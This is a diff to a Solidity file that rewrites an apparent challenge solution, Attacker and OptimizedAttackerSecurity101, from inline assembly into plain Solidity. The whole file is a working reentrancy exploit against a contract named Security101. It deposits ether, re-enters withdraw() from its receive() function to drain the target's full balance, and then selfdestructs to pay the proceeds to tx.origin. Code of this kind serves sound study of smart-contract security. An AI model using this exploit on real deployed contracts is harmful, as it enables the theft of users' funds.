@@ -19,42 +19,33 @@ contract Security101 {
 }
 
 contract Attacker {
-    address internal immutable attacked;
+    address payable internal immutable attacked;
 
-    constructor(address _attacked) payable {
+    event Here(bool suc);
+
+    constructor(address payable _attacked) payable {
         attacked = _attacked;
-        assembly {
-            mstore(0, 0xd0e30db0)
-            let suc := call(gas(), _attacked, callvalue(), 28, 8, 0, 0)
-        }
+        Security101(_attacked).deposit{value: msg.value}();
     }
 
     receive() external payable {
-        address _attacked = attacked;
-        assembly {
-            let amt := 1000000000000000000
-            if gt(selfbalance(), amt) { stop() }
-            
-            let _balance := selfbalance()
-            mstore( 0, 0x2e1a7d4d)
-            mstore(32, amt)
-            let suc := call(gas(), _attacked, 0, 28, 36, 0, 0)
+        address payable _attacked = attacked;
+        uint amt = 1000000000000000000;
+        if(address(this).balance > amt) return;
 
-            if eq(_balance, amt) { stop() }
+        uint _balance = address(this).balance;
+        try Security101(_attacked).withdraw(amt) {} catch {}
 
-            mstore(32, balance(_attacked))
-            suc := call(gas(), _attacked, 0, 28, 36, 0, 0)
-            selfdestruct(origin())
-        }
+        if(_balance == amt) return;
+
+        try Security101(_attacked).withdraw(_attacked.balance) {} catch {}
     }
 }
 
 contract OptimizedAttackerSecurity101{
-    constructor (address _attacked) payable {
+    constructor (address payable _attacked) payable {
         Attacker _attacker = new Attacker{value: msg.value}(_attacked);
-        assembly {
-            let res := call(gas(), _attacker, 0, 0, 0, 0, 0)
-            selfdestruct(origin())
-        }
+        address(_attacker).call('');
+        selfdestruct(payable(tx.origin));
     }
 }
